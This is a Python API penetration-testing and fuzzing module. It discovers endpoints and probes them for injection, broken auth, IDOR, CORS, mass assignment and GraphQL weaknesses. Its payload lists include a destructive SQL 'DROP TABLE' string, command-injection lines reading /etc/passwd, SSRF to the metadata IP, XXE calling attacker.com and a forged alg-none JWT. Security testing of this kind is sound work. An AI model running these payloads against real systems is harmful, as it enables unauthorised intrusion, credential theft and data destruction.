"""
API Security Testing Module - Comprehensive REST/GraphQL API Security Analysis
Full API penetration testing, fuzzing, and vulnerability discovery
"""

import asyncio
import hashlib
import json
import re
import urllib.parse
from dataclasses import dataclass, field
from typing import Dict, List, Any, Optional, Callable, Set, Tuple
from enum import Enum
from datetime import datetime
import logging
import base64
import random
import string


class APIType(Enum):
    """API types"""
    REST = "rest"
    GRAPHQL = "graphql"
    SOAP = "soap"
    GRPC = "grpc"
    WEBSOCKET = "websocket"


class AuthType(Enum):
    """Authentication types"""
    NONE = "none"
    BASIC = "basic"
    BEARER = "bearer"
    API_KEY = "api_key"
    OAUTH2 = "oauth2"
    JWT = "jwt"
    DIGEST = "digest"
    CUSTOM = "custom"


class VulnSeverity(Enum):
    """Vulnerability severity"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class APIEndpoint:
    """Represents an API endpoint"""
    id: str
    url: str
    method: str
    path: str
    parameters: Dict[str, Any] = field(default_factory=dict)
    headers: Dict[str, str] = field(default_factory=dict)
    body_schema: Dict[str, Any] = field(default_factory=dict)
    auth_required: bool = False
    auth_type: AuthType = AuthType.NONE
    response_codes: List[int] = field(default_factory=list)
    vulnerabilities: List[Dict[str, Any]] = field(default_factory=list)
    discovered_at: datetime = field(default_factory=datetime.now)
    last_tested: Optional[datetime] = None
    metadata: Dict[str, Any] = field(default_factory=dict)


@dataclass
class APIVulnerability:
    """API vulnerability finding"""
    id: str
    endpoint_id: str
    severity: VulnSeverity
    vuln_type: str
    title: str
    description: str
    request: str
    response: str
    evidence: str = ""
    remediation: str = ""
    cwe_id: Optional[str] = None
    cvss_score: float = 0.0
    timestamp: datetime = field(default_factory=datetime.now)


@dataclass
class FuzzResult:
    """Fuzzing result"""
    id: str
    endpoint_id: str
    payload: str
    parameter: str
    status_code: int
    response_time: float
    response_size: int
    triggered_error: bool = False
    interesting: bool = False
    notes: str = ""


@dataclass
class APISecurityReport:
    """API security assessment report"""
    id: str
    target_url: str
    api_type: APIType
    endpoints_discovered: int
    vulnerabilities_found: int
    critical_count: int
    high_count: int
    medium_count: int
    low_count: int
    info_count: int
    scan_duration: float
    timestamp: datetime = field(default_factory=datetime.now)
    findings: List[APIVulnerability] = field(default_factory=list)


class APISecurityTester:
    """
    Advanced API Security Testing Framework
    
    Features:
    - API discovery and enumeration
    - Authentication testing
    - Injection testing (SQL, NoSQL, Command)
    - Business logic flaws
    - Rate limiting bypass
    - BOLA/IDOR testing
    - Mass assignment
    - JWT vulnerabilities
    - GraphQL introspection
    - API fuzzing
    """
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.endpoints: Dict[str, APIEndpoint] = {}
        self.vulnerabilities: Dict[str, APIVulnerability] = {}
        self.is_running = False
        self.callbacks: List[Callable] = []
        
        # Attack payloads
        self.payloads = self._load_payloads()
        
        # Fuzzing wordlists
        self.wordlists = self._load_wordlists()
    
    def _load_payloads(self) -> Dict[str, List[str]]:
        """Load attack payloads"""
        return {
            "sqli": [
                "' OR '1'='1",
                "' OR '1'='1'--",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users--",
                "1' AND '1'='1",
                "admin'--",
                "' OR 1=1#",
                "') OR ('1'='1",
                "1; SELECT * FROM users",
                "' WAITFOR DELAY '0:0:5'--",
            ],
            "nosql": [
                '{"$gt": ""}',
                '{"$ne": null}',
                '{"$regex": ".*"}',
                '{"$where": "1==1"}',
                "true, $where: '1 == 1'",
                "'; return true; var foo='",
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "'-alert('XSS')-'",
                "<body onload=alert('XSS')>",
            ],
            "command": [
                "; ls -la",
                "| cat /etc/passwd",
                "` whoami`",
                "$(cat /etc/passwd)",
                "|| dir",
                "& ipconfig",
                "\n/bin/cat /etc/passwd",
            ],
            "ssrf": [
                "http://localhost",
                "http://127.0.0.1",
                "http://[::1]",
                "http://169.254.169.254",
                "file:///etc/passwd",
                "http://0.0.0.0",
                "http://internal-service",
            ],
            "xxe": [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]><foo>&xxe;</foo>',
            ],
            "ssti": [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "#{7*7}",
                "*{7*7}",
                "@(7*7)",
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            ],
        }
    
    def _load_wordlists(self) -> Dict[str, List[str]]:
        """Load fuzzing wordlists"""
        return {
            "endpoints": [
                "/api", "/api/v1", "/api/v2", "/api/v3",
                "/graphql", "/graphiql",
                "/swagger", "/swagger.json", "/swagger-ui",
                "/openapi", "/openapi.json",
                "/admin", "/admin/api",
                "/users", "/user", "/profile",
                "/auth", "/login", "/logout", "/register",
                "/token", "/refresh", "/oauth",
                "/config", "/settings", "/debug",
                "/health", "/status", "/metrics",
                "/internal", "/private", "/secret",
                "/backup", "/export", "/import",
            ],
            "parameters": [
                "id", "user_id", "userId", "user",
                "email", "username", "password",
                "token", "api_key", "apiKey",
                "admin", "role", "permissions",
                "file", "path", "url", "redirect",
                "callback", "next", "return_url",
                "query", "search", "filter", "sort",
                "page", "limit", "offset", "size",
            ],
            "http_methods": [
                "GET", "POST", "PUT", "DELETE",
                "PATCH", "OPTIONS", "HEAD", "TRACE",
            ],
        }
    
    def add_callback(self, callback: Callable):
        """Add event callback"""
        self.callbacks.append(callback)
    
    def _emit(self, event: str, data: Any):
        """Emit event to callbacks"""
        for callback in self.callbacks:
            try:
                callback(event, data)
            except Exception as e:
                self.logger.error(f"Callback error: {e}")
    
    async def discover_endpoints(self, base_url: str,
                                 wordlist: List[str] = None,
                                 headers: Dict[str, str] = None) -> List[APIEndpoint]:
        """
        Discover API endpoints
        
        Args:
            base_url: Base API URL
            wordlist: Custom endpoint wordlist
            headers: Custom headers
            
        Returns:
            List of discovered endpoints
        """
        import aiohttp
        
        if wordlist is None:
            wordlist = self.wordlists["endpoints"]
        
        if headers is None:
            headers = {"User-Agent": "API-Security-Tester/1.0"}
        
        self._emit("discovery_started", {"url": base_url})
        
        discovered = []
        
        async with aiohttp.ClientSession() as session:
            for path in wordlist:
                url = urllib.parse.urljoin(base_url, path)
                
                for method in ["GET", "POST", "PUT", "OPTIONS"]:
                    try:
                        async with session.request(
                            method, url,
                            headers=headers,
                            timeout=aiohttp.ClientTimeout(total=5),
                            ssl=False
                        ) as response:
                            if response.status not in [404, 405]:
                                endpoint = APIEndpoint(
                                    id=hashlib.md5(f"{method}{url}".encode()).hexdigest()[:12],
                                    url=url,
                                    method=method,
                                    path=path,
                                    response_codes=[response.status],
                                )
                                
                                # Check authentication requirement
                                if response.status == 401:
                                    endpoint.auth_required = True
                                    auth_header = response.headers.get("WWW-Authenticate", "")
                                    if "Bearer" in auth_header:
                                        endpoint.auth_type = AuthType.BEARER
                                    elif "Basic" in auth_header:
                                        endpoint.auth_type = AuthType.BASIC
                                
                                # Detect API type
                                content_type = response.headers.get("Content-Type", "")
                                if "graphql" in path.lower():
                                    endpoint.metadata["api_type"] = APIType.GRAPHQL.value
                                elif "text/xml" in content_type:
                                    endpoint.metadata["api_type"] = APIType.SOAP.value
                                else:
                                    endpoint.metadata["api_type"] = APIType.REST.value
                                
                                discovered.append(endpoint)
                                self.endpoints[endpoint.id] = endpoint
                                self._emit("endpoint_discovered", {"endpoint": endpoint})
                                
                    except Exception as e:
                        pass
        
        self._emit("discovery_completed", {"count": len(discovered)})
        
        return discovered
    
    async def test_endpoint(self, endpoint_id: str,
                           auth: Dict[str, str] = None) -> List[APIVulnerability]:
        """
        Perform comprehensive security testing on endpoint
        
        Args:
            endpoint_id: Endpoint ID
            auth: Authentication credentials
            
        Returns:
            List of vulnerabilities found
        """
        endpoint = self.endpoints.get(endpoint_id)
        if not endpoint:
            raise ValueError(f"Endpoint {endpoint_id} not found")
        
        self._emit("testing_started", {"endpoint": endpoint_id})
        
        vulnerabilities = []
        
        # Run all security tests
        tests = [
            self._test_injection,
            self._test_authentication,
            self._test_authorization,
            self._test_rate_limiting,
            self._test_cors,
            self._test_security_headers,
            self._test_information_disclosure,
            self._test_mass_assignment,
        ]
        
        for test in tests:
            try:
                vulns = await test(endpoint, auth)
                vulnerabilities.extend(vulns)
            except Exception as e:
                self.logger.error(f"Test error: {e}")
        
        endpoint.vulnerabilities = [v.__dict__ for v in vulnerabilities]
        endpoint.last_tested = datetime.now()
        
        self._emit("testing_completed", {"endpoint": endpoint_id, "vulns": len(vulnerabilities)})
        
        return vulnerabilities
    
    async def _test_injection(self, endpoint: APIEndpoint,
                             auth: Dict[str, str] = None) -> List[APIVulnerability]:
        """Test for injection vulnerabilities"""
        import aiohttp
        
        vulnerabilities = []
        
        injection_tests = [
            ("sqli", "SQL Injection", "CWE-89"),
            ("nosql", "NoSQL Injection", "CWE-943"),
            ("command", "Command Injection", "CWE-78"),
            ("xss", "Cross-Site Scripting", "CWE-79"),
        ]
        
        headers = {"Content-Type": "application/json"}
        if auth:
            headers.update(auth)
        
        async with aiohttp.ClientSession() as session:
            for inject_type, title, cwe in injection_tests:
                payloads = self.payloads.get(inject_type, [])
                
                for payload in payloads[:5]:  # Limit payloads
                    try:
                        # Test in URL parameters
                        test_url = f"{endpoint.url}?test={urllib.parse.quote(payload)}"
                        
                        async with session.request(
                            endpoint.method, test_url,
                            headers=headers,
                            timeout=aiohttp.ClientTimeout(total=10),
                            ssl=False
                        ) as response:
                            body = await response.text()
                            
                            # Check for error patterns
                            if self._detect_injection_success(inject_type, body, response.status):
                                vuln = APIVulnerability(
                                    id=hashlib.md5(f"{endpoint.id}{inject_type}{payload}".encode()).hexdigest()[:12],
                                    endpoint_id=endpoint.id,
                                    severity=VulnSeverity.CRITICAL if inject_type in ["sqli", "command"] else VulnSeverity.HIGH,
                                    vuln_type=inject_type,
                                    title=title,
                                    description=f"{title} vulnerability detected in URL parameter",
                                    request=f"{endpoint.method} {test_url}",
                                    response=body[:500],
                                    evidence=payload,
                                    cwe_id=cwe,
                                    cvss_score=9.8 if inject_type in ["sqli", "command"] else 7.5,
                                )
                                vulnerabilities.append(vuln)
                                self.vulnerabilities[vuln.id] = vuln
                                break
                        
                        # Test in JSON body for POST/PUT
                        if endpoint.method in ["POST", "PUT", "PATCH"]:
                            body_data = {"test": payload}
                            
                            async with session.request(
                                endpoint.method, endpoint.url,
                                json=body_data,
                                headers=headers,
                                timeout=aiohttp.ClientTimeout(total=10),
                                ssl=False
                            ) as response:
                                body = await response.text()
                                
                                if self._detect_injection_success(inject_type, body, response.status):
                                    vuln = APIVulnerability(
                                        id=hashlib.md5(f"{endpoint.id}{inject_type}body{payload}".encode()).hexdigest()[:12],
                                        endpoint_id=endpoint.id,
                                        severity=VulnSeverity.CRITICAL if inject_type in ["sqli", "command"] else VulnSeverity.HIGH,
                                        vuln_type=inject_type,
                                        title=title,
                                        description=f"{title} vulnerability detected in request body",
                                        request=f"{endpoint.method} {endpoint.url}\n{json.dumps(body_data)}",
                                        response=body[:500],
                                        evidence=payload,
                                        cwe_id=cwe,
                                        cvss_score=9.8 if inject_type in ["sqli", "command"] else 7.5,
                                    )
                                    vulnerabilities.append(vuln)
                                    self.vulnerabilities[vuln.id] = vuln
                                    break
                                    
                    except Exception as e:
                        pass
        
        return vulnerabilities
    
    def _detect_injection_success(self, inject_type: str, response: str, status_code: int) -> bool:
        """Detect if injection was successful"""
        error_patterns = {
            "sqli": [
                "sql syntax", "mysql", "postgresql", "oracle",
                "sqlite", "syntax error", "unclosed quotation",
                "quoted string not properly terminated",
            ],
            "nosql": [
                "mongodb", "bson", "objectid", "json parse error",
            ],
            "command": [
                "root:", "/bin/bash", "uid=", "gid=",
                "command not found", "no such file",
            ],
            "xss": [
                "<script>alert", "javascript:", "onerror=",
            ],
        }
        
        patterns = error_patterns.get(inject_type, [])
        response_lower = response.lower()
        
        for pattern in patterns:
            if pattern in response_lower:
                return True
        
        # Check for server errors
        if status_code == 500:
            return True
        
        return False
    
    async def _test_authentication(self, endpoint: APIEndpoint,
                                   auth: Dict[str, str] = None) -> List[APIVulnerability]:
        """Test authentication vulnerabilities"""
        import aiohttp
        
        vulnerabilities = []
        
        async with aiohttp.ClientSession() as session:
            # Test for missing authentication
            try:
                async with session.request(
                    endpoint.method, endpoint.url,
                    timeout=aiohttp.ClientTimeout(total=5),
                    ssl=False
                ) as response:
                    if response.status == 200 and endpoint.auth_required:
                        vuln = APIVulnerability(
                            id=hashlib.md5(f"{endpoint.id}noauth".encode()).hexdigest()[:12],
                            endpoint_id=endpoint.id,
                            severity=VulnSeverity.CRITICAL,
                            vuln_type="broken_authentication",
                            title="Broken Authentication",
                            description="Endpoint accessible without authentication",
                            request=f"{endpoint.method} {endpoint.url}",
                            response=f"Status: {response.status}",
                            cwe_id="CWE-287",
                            cvss_score=9.8,
                        )
                        vulnerabilities.append(vuln)
            except:
                pass
            
            # Test for weak JWT
            if endpoint.auth_type == AuthType.JWT:
                # Test "alg: none" vulnerability
                weak_jwt = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwiYWRtaW4iOnRydWV9."
                try:
                    async with session.request(
                        endpoint.method, endpoint.url,
                        headers={"Authorization": f"Bearer {weak_jwt}"},
                        timeout=aiohttp.ClientTimeout(total=5),
                        ssl=False
                    ) as response:
                        if response.status == 200:
                            vuln = APIVulnerability(
                                id=hashlib.md5(f"{endpoint.id}jwtalgnonee".encode()).hexdigest()[:12],
                                endpoint_id=endpoint.id,
                                severity=VulnSeverity.CRITICAL,
                                vuln_type="jwt_alg_none",
                                title="JWT Algorithm None Accepted",
                                description="API accepts JWT tokens with 'alg: none'",
                                request=f"Authorization: Bearer {weak_jwt}",
                                response=f"Status: {response.status}",
                                cwe_id="CWE-327",
                                cvss_score=9.8,
                            )
                            vulnerabilities.append(vuln)
                except:
                    pass
        
        return vulnerabilities
    
    async def _test_authorization(self, endpoint: APIEndpoint,
                                  auth: Dict[str, str] = None) -> List[APIVulnerability]:
        """Test for authorization vulnerabilities (BOLA/IDOR)"""
        import aiohttp
        
        vulnerabilities = []
        
        # Look for ID patterns in URL
        id_patterns = [
            r'/(\d+)(?:/|$)',  # Numeric ID
            r'/([a-f0-9]{24})(?:/|$)',  # MongoDB ObjectID
            r'/([a-f0-9-]{36})(?:/|$)',  # UUID
        ]
        
        for pattern in id_patterns:
            match = re.search(pattern, endpoint.url)
            if match:
                original_id = match.group(1)
                
                # Generate test IDs
                if original_id.isdigit():
                    test_ids = [str(int(original_id) + 1), str(int(original_id) - 1), "1", "0"]
                else:
                    test_ids = ["000000000000000000000001", "test123"]
                
                headers = auth or {}
                
                async with aiohttp.ClientSession() as session:
                    for test_id in test_ids:
                        test_url = endpoint.url.replace(original_id, test_id)
                        
                        try:
                            async with session.request(
                                endpoint.method, test_url,
                                headers=headers,
                                timeout=aiohttp.ClientTimeout(total=5),
                                ssl=False
                            ) as response:
                                if response.status == 200:
                                    vuln = APIVulnerability(
                                        id=hashlib.md5(f"{endpoint.id}idor{test_id}".encode()).hexdigest()[:12],
                                        endpoint_id=endpoint.id,
                                        severity=VulnSeverity.HIGH,
                                        vuln_type="bola_idor",
                                        title="Broken Object Level Authorization (BOLA/IDOR)",
                                        description=f"Able to access resource with ID: {test_id}",
                                        request=f"{endpoint.method} {test_url}",
                                        response=f"Status: {response.status}",
                                        cwe_id="CWE-639",
                                        cvss_score=7.5,
                                    )
                                    vulnerabilities.append(vuln)
                                    break
                        except:
                            pass
        
        return vulnerabilities
    
    async def _test_rate_limiting(self, endpoint: APIEndpoint,
                                  auth: Dict[str, str] = None) -> List[APIVulnerability]:
        """Test for rate limiting"""
        import aiohttp
        
        vulnerabilities = []
        
        headers = auth or {}
        
        async with aiohttp.ClientSession() as session:
            success_count = 0
            
            for i in range(50):  # Send 50 rapid requests
                try:
                    async with session.request(
                        endpoint.method, endpoint.url,
                        headers=headers,
                        timeout=aiohttp.ClientTimeout(total=2),
                        ssl=False
                    ) as response:
                        if response.status == 200:
                            success_count += 1
                except:
                    pass
            
            if success_count >= 45:  # 90% success rate
                vuln = APIVulnerability(
                    id=hashlib.md5(f"{endpoint.id}ratelimit".encode()).hexdigest()[:12],
                    endpoint_id=endpoint.id,
                    severity=VulnSeverity.MEDIUM,
                    vuln_type="no_rate_limiting",
                    title="Missing Rate Limiting",
                    description=f"Sent 50 requests, {success_count} succeeded. No rate limiting detected.",
                    request=f"50x {endpoint.method} {endpoint.url}",
                    response=f"Success rate: {success_count}/50",
                    cwe_id="CWE-770",
                    cvss_score=5.3,
                )
                vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    async def _test_cors(self, endpoint: APIEndpoint,
                        auth: Dict[str, str] = None) -> List[APIVulnerability]:
        """Test CORS configuration"""
        import aiohttp
        
        vulnerabilities = []
        
        test_origins = [
            "https://evil.com",
            "null",
            "https://attacker.com",
        ]
        
        async with aiohttp.ClientSession() as session:
            for origin in test_origins:
                headers = {"Origin": origin}
                if auth:
                    headers.update(auth)
                
                try:
                    async with session.request(
                        "OPTIONS", endpoint.url,
                        headers=headers,
                        timeout=aiohttp.ClientTimeout(total=5),
                        ssl=False
                    ) as response:
                        acao = response.headers.get("Access-Control-Allow-Origin", "")
                        acac = response.headers.get("Access-Control-Allow-Credentials", "")
                        
                        if acao == "*" or acao == origin:
                            severity = VulnSeverity.HIGH if acac.lower() == "true" else VulnSeverity.MEDIUM
                            
                            vuln = APIVulnerability(
                                id=hashlib.md5(f"{endpoint.id}cors{origin}".encode()).hexdigest()[:12],
                                endpoint_id=endpoint.id,
                                severity=severity,
                                vuln_type="cors_misconfiguration",
                                title="CORS Misconfiguration",
                                description=f"Origin '{origin}' is reflected in ACAO header",
                                request=f"Origin: {origin}",
                                response=f"ACAO: {acao}, ACAC: {acac}",
                                cwe_id="CWE-942",
                                cvss_score=6.5 if acac.lower() == "true" else 4.3,
                            )
                            vulnerabilities.append(vuln)
                            break
                except:
                    pass
        
        return vulnerabilities
    
    async def _test_security_headers(self, endpoint: APIEndpoint,
                                     auth: Dict[str, str] = None) -> List[APIVulnerability]:
        """Test for missing security headers"""
        import aiohttp
        
        vulnerabilities = []
        
        required_headers = [
            ("X-Content-Type-Options", "nosniff"),
            ("X-Frame-Options", None),
            ("Strict-Transport-Security", None),
            ("Content-Security-Policy", None),
            ("X-XSS-Protection", None),
        ]
        
        headers = auth or {}
        
        async with aiohttp.ClientSession() as session:
            try:
                async with session.request(
                    endpoint.method, endpoint.url,
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=5),
                    ssl=False
                ) as response:
                    missing = []
                    
                    for header, expected_value in required_headers:
                        value = response.headers.get(header)
                        if not value:
                            missing.append(header)
                        elif expected_value and value != expected_value:
                            missing.append(f"{header} (incorrect)")
                    
                    if missing:
                        vuln = APIVulnerability(
                            id=hashlib.md5(f"{endpoint.id}headers".encode()).hexdigest()[:12],
                            endpoint_id=endpoint.id,
                            severity=VulnSeverity.LOW,
                            vuln_type="missing_security_headers",
                            title="Missing Security Headers",
                            description=f"Missing headers: {', '.join(missing)}",
                            request=f"{endpoint.method} {endpoint.url}",
                            response=f"Response headers analyzed",
                            cwe_id="CWE-693",
                            cvss_score=3.1,
                        )
                        vulnerabilities.append(vuln)
            except:
                pass
        
        return vulnerabilities
    
    async def _test_information_disclosure(self, endpoint: APIEndpoint,
                                           auth: Dict[str, str] = None) -> List[APIVulnerability]:
        """Test for information disclosure"""
        import aiohttp
        
        vulnerabilities = []
        
        headers = auth or {}
        
        async with aiohttp.ClientSession() as session:
            try:
                async with session.request(
                    endpoint.method, endpoint.url,
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=5),
                    ssl=False
                ) as response:
                    body = await response.text()
                    
                    # Check for sensitive data in response
                    patterns = [
                        (r'"password"\s*:\s*"[^"]+"', "Password in response"),
                        (r'"token"\s*:\s*"[^"]+"', "Token in response"),
                        (r'"api_key"\s*:\s*"[^"]+"', "API key in response"),
                        (r'"secret"\s*:\s*"[^"]+"', "Secret in response"),
                        (r'stack\s*trace', "Stack trace disclosed"),
                        (r'exception', "Exception details disclosed"),
                    ]
                    
                    for pattern, title in patterns:
                        if re.search(pattern, body, re.I):
                            vuln = APIVulnerability(
                                id=hashlib.md5(f"{endpoint.id}disclosure{pattern}".encode()).hexdigest()[:12],
                                endpoint_id=endpoint.id,
                                severity=VulnSeverity.MEDIUM,
                                vuln_type="information_disclosure",
                                title=title,
                                description=f"Sensitive information found in response",
                                request=f"{endpoint.method} {endpoint.url}",
                                response=body[:500],
                                cwe_id="CWE-200",
                                cvss_score=5.3,
                            )
                            vulnerabilities.append(vuln)
                    
                    # Check for version disclosure
                    server = response.headers.get("Server", "")
                    x_powered = response.headers.get("X-Powered-By", "")
                    
                    if server and re.search(r'\d+\.\d+', server):
                        vuln = APIVulnerability(
                            id=hashlib.md5(f"{endpoint.id}serverver".encode()).hexdigest()[:12],
                            endpoint_id=endpoint.id,
                            severity=VulnSeverity.INFO,
                            vuln_type="version_disclosure",
                            title="Server Version Disclosure",
                            description=f"Server header reveals version: {server}",
                            request=f"{endpoint.method} {endpoint.url}",
                            response=f"Server: {server}",
                            cwe_id="CWE-200",
                            cvss_score=2.1,
                        )
                        vulnerabilities.append(vuln)
                        
            except:
                pass
        
        return vulnerabilities
    
    async def _test_mass_assignment(self, endpoint: APIEndpoint,
                                   auth: Dict[str, str] = None) -> List[APIVulnerability]:
        """Test for mass assignment vulnerabilities"""
        import aiohttp
        
        vulnerabilities = []
        
        if endpoint.method not in ["POST", "PUT", "PATCH"]:
            return vulnerabilities
        
        headers = {"Content-Type": "application/json"}
        if auth:
            headers.update(auth)
        
        # Test payloads with elevated privileges
        test_payloads = [
            {"admin": True},
            {"role": "admin"},
            {"isAdmin": True},
            {"permissions": ["*"]},
            {"verified": True},
            {"balance": 999999},
        ]
        
        async with aiohttp.ClientSession() as session:
            for payload in test_payloads:
                try:
                    async with session.request(
                        endpoint.method, endpoint.url,
                        json=payload,
                        headers=headers,
                        timeout=aiohttp.ClientTimeout(total=5),
                        ssl=False
                    ) as response:
                        if response.status in [200, 201]:
                            body = await response.text()
                            
                            # Check if our parameter was reflected
                            for key in payload.keys():
                                if key in body and str(payload[key]).lower() in body.lower():
                                    vuln = APIVulnerability(
                                        id=hashlib.md5(f"{endpoint.id}massassign{key}".encode()).hexdigest()[:12],
                                        endpoint_id=endpoint.id,
                                        severity=VulnSeverity.HIGH,
                                        vuln_type="mass_assignment",
                                        title=f"Mass Assignment: {key}",
                                        description=f"Sensitive field '{key}' can be modified",
                                        request=json.dumps(payload),
                                        response=body[:500],
                                        cwe_id="CWE-915",
                                        cvss_score=8.1,
                                    )
                                    vulnerabilities.append(vuln)
                except:
                    pass
        
        return vulnerabilities
    
    async def fuzz_endpoint(self, endpoint_id: str,
                           parameter: str,
                           wordlist: List[str] = None,
                           auth: Dict[str, str] = None) -> List[FuzzResult]:
        """
        Fuzz a specific parameter
        
        Args:
            endpoint_id: Endpoint ID
            parameter: Parameter to fuzz
            wordlist: Custom wordlist
            auth: Authentication
            
        Returns:
            List of fuzz results
        """
        import aiohttp
        
        endpoint = self.endpoints.get(endpoint_id)
        if not endpoint:
            raise ValueError(f"Endpoint {endpoint_id} not found")
        
        if wordlist is None:
            wordlist = self._generate_fuzz_wordlist()
        
        self._emit("fuzzing_started", {"endpoint": endpoint_id, "parameter": parameter})
        
        results = []
        headers = auth or {}
        
        async with aiohttp.ClientSession() as session:
            for payload in wordlist:
                try:
                    start_time = datetime.now()
                    
                    # Build URL with fuzzed parameter
                    test_url = f"{endpoint.url}?{parameter}={urllib.parse.quote(str(payload))}"
                    
                    async with session.request(
                        endpoint.method, test_url,
                        headers=headers,
                        timeout=aiohttp.ClientTimeout(total=10),
                        ssl=False
                    ) as response:
                        response_time = (datetime.now() - start_time).total_seconds()
                        body = await response.text()
                        
                        result = FuzzResult(
                            id=hashlib.md5(f"{endpoint_id}{parameter}{payload}".encode()).hexdigest()[:12],
                            endpoint_id=endpoint_id,
                            payload=str(payload),
                            parameter=parameter,
                            status_code=response.status,
                            response_time=response_time,
                            response_size=len(body),
                            triggered_error=response.status >= 500,
                            interesting=response.status in [500, 403, 401] or response_time > 5,
                        )
                        results.append(result)
                        
                except Exception as e:
                    result = FuzzResult(
                        id=hashlib.md5(f"{endpoint_id}{parameter}{payload}".encode()).hexdigest()[:12],
                        endpoint_id=endpoint_id,
                        payload=str(payload),
                        parameter=parameter,
                        status_code=0,
                        response_time=0,
                        response_size=0,
                        triggered_error=True,
                        notes=str(e),
                    )
                    results.append(result)
        
        self._emit("fuzzing_completed", {"count": len(results)})
        
        return results
    
    def _generate_fuzz_wordlist(self) -> List[str]:
        """Generate fuzzing wordlist"""
        wordlist = []
        
        # Edge cases
        wordlist.extend(["", " ", "null", "undefined", "NaN", "Infinity"])
        
        # Numbers
        wordlist.extend([0, -1, 1, 999999999, -999999999, 0.1, -0.1])
        
        # Strings
        wordlist.extend(["A" * 1000, "A" * 10000, "<script>", "{{", "${", "%s%s%s"])
        
        # Special characters
        wordlist.extend(["'", '"', "`", "\\", "\n", "\r", "\t", "\0"])
        
        # Unicode
        wordlist.extend(["日本語", "🔥", "\u0000", "\uFFFF"])
        
        return wordlist
    
    async def test_graphql(self, endpoint_url: str,
                          auth: Dict[str, str] = None) -> List[APIVulnerability]:
        """
        Test GraphQL-specific vulnerabilities
        
        Args:
            endpoint_url: GraphQL endpoint URL
            auth: Authentication
            
        Returns:
            List of vulnerabilities
        """
        import aiohttp
        
        vulnerabilities = []
        
        headers = {"Content-Type": "application/json"}
        if auth:
            headers.update(auth)
        
        async with aiohttp.ClientSession() as session:
            # Test introspection
            introspection_query = {
                "query": """
                    query IntrospectionQuery {
                        __schema {
                            types {
                                name
                                fields {
                                    name
                                }
                            }
                        }
                    }
                """
            }
            
            try:
                async with session.post(
                    endpoint_url,
                    json=introspection_query,
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=10),
                    ssl=False
                ) as response:
                    body = await response.text()
                    
                    if "__schema" in body and "types" in body:
                        vuln = APIVulnerability(
                            id=hashlib.md5(f"{endpoint_url}introspection".encode()).hexdigest()[:12],
                            endpoint_id="graphql",
                            severity=VulnSeverity.MEDIUM,
                            vuln_type="graphql_introspection",
                            title="GraphQL Introspection Enabled",
                            description="Schema introspection reveals all API types and fields",
                            request=json.dumps(introspection_query),
                            response=body[:500],
                            cwe_id="CWE-200",
                            cvss_score=5.3,
                        )
                        vulnerabilities.append(vuln)
            except:
                pass
            
            # Test for query depth/complexity issues
            deep_query = {
                "query": """
                    query {
                        user {
                            friends {
                                friends {
                                    friends {
                                        friends {
                                            id
                                        }
                                    }
                                }
                            }
                        }
                    }
                """
            }
            
            try:
                async with session.post(
                    endpoint_url,
                    json=deep_query,
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=30),
                    ssl=False
                ) as response:
                    if response.status == 200:
                        vuln = APIVulnerability(
                            id=hashlib.md5(f"{endpoint_url}depth".encode()).hexdigest()[:12],
                            endpoint_id="graphql",
                            severity=VulnSeverity.MEDIUM,
                            vuln_type="graphql_depth_limit",
                            title="No GraphQL Query Depth Limit",
                            description="Deep nested queries accepted (DoS risk)",
                            request=json.dumps(deep_query),
                            response=f"Status: {response.status}",
                            cwe_id="CWE-770",
                            cvss_score=5.3,
                        )
                        vulnerabilities.append(vuln)
            except:
                pass
        
        return vulnerabilities
    
    def generate_report(self, target_url: str) -> APISecurityReport:
        """Generate security assessment report"""
        vulns = list(self.vulnerabilities.values())
        
        report = APISecurityReport(
            id=hashlib.md5(target_url.encode()).hexdigest()[:12],
            target_url=target_url,
            api_type=APIType.REST,
            endpoints_discovered=len(self.endpoints),
            vulnerabilities_found=len(vulns),
            critical_count=sum(1 for v in vulns if v.severity == VulnSeverity.CRITICAL),
            high_count=sum(1 for v in vulns if v.severity == VulnSeverity.HIGH),
            medium_count=sum(1 for v in vulns if v.severity == VulnSeverity.MEDIUM),
            low_count=sum(1 for v in vulns if v.severity == VulnSeverity.LOW),
            info_count=sum(1 for v in vulns if v.severity == VulnSeverity.INFO),
            scan_duration=0.0,
            findings=vulns,
        )
        
        return report
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get scanner statistics"""
        vulns = list(self.vulnerabilities.values())
        
        return {
            "total_endpoints": len(self.endpoints),
            "total_vulnerabilities": len(vulns),
            "critical": sum(1 for v in vulns if v.severity == VulnSeverity.CRITICAL),
            "high": sum(1 for v in vulns if v.severity == VulnSeverity.HIGH),
            "medium": sum(1 for v in vulns if v.severity == VulnSeverity.MEDIUM),
            "low": sum(1 for v in vulns if v.severity == VulnSeverity.LOW),
            "info": sum(1 for v in vulns if v.severity == VulnSeverity.INFO),
        }
